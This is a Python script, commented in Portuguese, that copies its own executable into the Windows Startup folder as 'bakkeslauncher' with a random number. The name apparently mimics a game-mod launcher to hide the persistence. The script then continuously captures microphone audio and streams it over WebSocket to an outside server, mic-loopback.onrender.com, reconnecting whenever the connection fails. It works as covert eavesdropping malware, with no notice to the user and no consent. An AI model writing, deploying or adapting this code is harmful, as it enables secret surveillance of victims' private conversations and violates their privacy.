import time
import websocket
import sounddevice as sd
import numpy as np
import struct
import os
import shutil
import sys
import uuid
import random

current_exe = sys.executable
USERNAME = os.environ.get("USERNAME")
startup_folder = os.path.join("C:\\Users", USERNAME, "AppData", "Roaming",
                              "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

for f in os.listdir(startup_folder):
    if f.startswith("bakkeslauncher") and f.endswith(".exe"):
        try:
            os.remove(os.path.join(startup_folder, f))
            print(f"Arquivo antigo {f} removido.")
        except Exception as e:
            print(f"Erro ao remover {f}: {e}")

random_number = random.randint(10, 99)
dest_name = f"bakkeslauncher{random_number}.exe"
dest = os.path.join(startup_folder, dest_name)

try:
    shutil.copy(current_exe, dest)
    print(f"Copiado para Startup como {dest_name}.")
except Exception as e:
    print("Erro ao copiar para Startup:", e)

SERVER_URL = "mic-loopback.onrender.com"
SAMPLE_RATE = 44100
CHANNELS = 1
CHUNK = 1024
DTYPE = np.int16

TRANSMITTER_ID = str(uuid.uuid4()).encode()[:16]

def connect_ws(server_url):
    urls = [f"wss://{server_url}", f"ws://{server_url}"]
    ws = websocket.WebSocket()
    for ws_url in urls:
        try:
            print(f"Tentando conectar em {ws_url} ...")
            ws.connect(ws_url)
            print(f"Conectado com sucesso em {ws_url}")
            return ws
        except Exception as e:
            print(f"Falha ao conectar em {ws_url}: {e}")
    raise ConnectionError("Não foi possível conectar em nenhum servidor WS/WSS.")

ws = connect_ws(SERVER_URL)

def send_frame(data_bytes: bytes):
    try:
        header = struct.pack("!I", len(TRANSMITTER_ID) + len(data_bytes))
        ws.send(header + TRANSMITTER_ID + data_bytes, opcode=websocket.ABNF.OPCODE_BINARY)
    except Exception as e:
        print("Erro ao enviar frame:", e)

def callback(indata, frames, time_info, status):
    if status:
        print("Status:", status)
    send_frame(indata.tobytes())

def start_audio_stream():
    try:
        with sd.InputStream(samplerate=SAMPLE_RATE,
                            blocksize=CHUNK,
                            channels=CHANNELS,
                            dtype=DTYPE,
                            callback=callback):
            print("Capturando áudio e enviando...")
            send_frame(b"__transmitter_since")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("Encerrando transmissão...")
    except Exception as e:
        print("Erro na captura de áudio:", e)
    finally:
        try:
            send_frame(b"__END__")
            ws.close()
        except:
            pass

while True:
    try:
        start_audio_stream()
    except Exception as e:
        print(f"Erro geral: {e}. Tentando reconectar em 3 segundos...")
        time.sleep(3)
        ws = connect_ws(SERVER_URL)
